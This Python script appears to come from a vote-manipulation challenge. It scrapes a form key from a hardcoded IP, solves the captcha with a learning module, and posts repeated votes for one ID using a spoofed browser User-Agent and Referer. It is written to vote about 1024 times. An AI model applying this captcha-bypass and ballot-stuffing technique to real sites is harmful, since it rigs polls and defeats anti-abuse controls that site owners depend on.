#!/usr/bin/python3


"""this module will be used for voting 1024 times
    at the website provided"""
import urllib
from bs4 import BeautifulSoup
import requests
from captcha_learner import CaptchaLearner
from io import BytesIO
try:
    import Image
except ImportError:
    from PIL import Image

def download_captcha(session, url):
    req = session.get(url)
    img = Image.open(BytesIO(req.content))
    img.save(CaptchaLearner.temp_file_name)


def do_post_crack(captcha_learner):
    base_url = "http://158.69.76.135"
    captcha = base_url + "/tim.php"
    url = base_url + "/level5.php"
    hs = { 'Referer': url,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'} 

    if not isinstance(captcha_learner, CaptchaLearner):
        raise TypeError("captcha_learner must be CaptchaLearner type")
    session = requests.session()
    get_key_r = session.get(url, headers=hs)
    content = get_key_r.content
    soup = BeautifulSoup(content, 'html.parser')
    inputs = soup.find_all('input')
    for line in inputs:
        if line.get('name') == "key":
            key = line.get('value')
    download_captcha(session, captcha)
    captcha_val = learner.get_captcha()
    payload = {'id': '6666', 'key': key, 'holdthedoor': 'submit',
                'captcha': captcha_val}

    r = session.post(url, headers=hs, data=payload)
    status_code = r.status_code
    del session
    
    if status_code != 200 or len(r.content) < 300:
        return False
    return True

failed = 0
learner = CaptchaLearner()
while learner.best_test is None:
    res = do_post_crack(learner)
    if res == False:
        learner.test_fail()
    else:
        learner.test_success()
print("Learner found best test combination to be:\n{}".format(learner.best_test))
print("With a success rate of %{}".format(learner.best_test.get_success_rate()))
